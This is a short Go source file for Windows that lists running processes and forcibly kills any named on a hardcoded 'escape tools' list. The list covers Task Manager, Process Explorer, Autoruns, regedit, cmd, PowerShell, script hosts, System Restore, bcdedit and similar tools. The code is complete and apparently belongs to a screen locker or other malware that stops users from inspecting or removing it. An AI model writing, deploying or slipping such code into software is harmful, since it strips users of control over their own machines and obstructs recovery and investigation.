//go:build windows

package win32

import (
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var escapeTools = map[string]struct{}{
	"taskmgr.exe":        {},
	"procexp.exe":        {},
	"procexp64.exe":      {},
	"processhacker.exe":  {},
	"systeminformer.exe": {},
	"autoruns.exe":       {},
	"autorunsc.exe":      {},
	"regedit.exe":        {},
	"mmc.exe":            {},
	"cmd.exe":            {},
	"powershell.exe":     {},
	"pwsh.exe":           {},
	"wscript.exe":        {},
	"cscript.exe":        {},
	"mshta.exe":          {},
	"msconfig.exe":       {},
	"eventvwr.exe":       {},
	"rstrui.exe":         {},
	"bcdedit.exe":        {},
	"wbemtest.exe":       {},
}

func killEscapeTools() {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return
	}
	defer func() { _ = windows.CloseHandle(snapshot) }()

	self := uint32(os.Getpid())

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return
	}

	for {
		pid := entry.ProcessID
		if pid != 0 && pid != 4 && pid != self {
			name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
			if _, banned := escapeTools[name]; banned {
				terminateProcess(pid)
			}
		}
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			return
		}
	}
}

func terminateProcess(pid uint32) {
	handle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return
	}
	defer func() { _ = windows.CloseHandle(handle) }()
	_ = windows.TerminateProcess(handle, 1)
}
